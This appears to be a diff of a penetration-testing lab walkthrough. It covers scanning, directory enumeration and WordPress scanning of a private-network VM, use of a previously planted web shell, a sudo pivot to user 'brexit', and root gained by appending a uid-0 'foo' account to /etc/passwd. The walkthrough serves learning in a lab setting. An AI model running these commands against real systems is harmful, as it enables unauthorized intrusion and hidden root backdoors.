@@ -3,6 +3,7 @@
 # 1 Information gathering
 ## 1.1 Discovery host
 `nmap -Pn -F 192.168.122.1/24 -oN host_discovery.txt`
+
 ![964ae28c347ea800c0ca3cb1af9404fc.png](./_resources/f8184439c1bc485198e1fbabbc256194.png)
 
 
@@ -17,6 +18,7 @@
 `gobuster dir -u http://192.168.122.128 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt --wildcard -o info.txt`
 `gobuster dir -u http://192.168.122.128 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --wildcard -o info1.txt`
 You will need grep data that not contain 400 status code:
+
 ![57f359a1ac8c6bb2a67ff4619507d0be.png](./_resources/cf75231c96414c28b812d0e075b996fa.png)
 
 ### 1.3.2 User manual in main page
@@ -30,6 +32,7 @@ It shows us the app version:
 ## 1.4 Web 8080
 ### 1.4.1 Dirb
 ![8d73d362506f8d8a4312bbd596efd2a3.png](./_resources/e1b093ad4cea4cd0b9eef71ba3285f35.png)
+
 Interesting, the target have wordpress, debug and shell directories.
 
 ### 1.4.2 Wpscan
@@ -43,6 +46,7 @@ Here we have a web shell previously uploaded by an attacker. I will use it.
 # 2 Exploitation
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 For reverse shell we can use the web shell:
+
 ![ff339e186917b0d67b44f0eccb33c84a.png](./_resources/30d8685843284d37ad9ed3289aa98dbb.png)
 
 
@@ -53,6 +57,7 @@ LinEnum returns some information:
 
 ## 3.1 First user
 `sudo -u brexit /bin/bash`
+
 ![928841574ea280986c8302033b2610e6.png](./_resources/dbdf0674767b42d2be38840ba5075579.png)
 
 ## 3.2 Getting root with openssl
@@ -63,4 +68,5 @@ Since we have write access as brexit user, we can use openssl to escalate privil
 With `echo`, let's add a new user manually:
 `echo 'foo:$1$foo$vIxZ6xcPqixL6sHxOWInM1:0:0:root:/root:/bin/bash' >> /etc/passwd`
 obs: Its necessary to use single quotes, or the new user is not added.
+
 ![c822d5c8d2b6c604aa7e0bfa3ca82185.png](./_resources/483d8f387d9f4c9c90c9eed9ec538208.png)
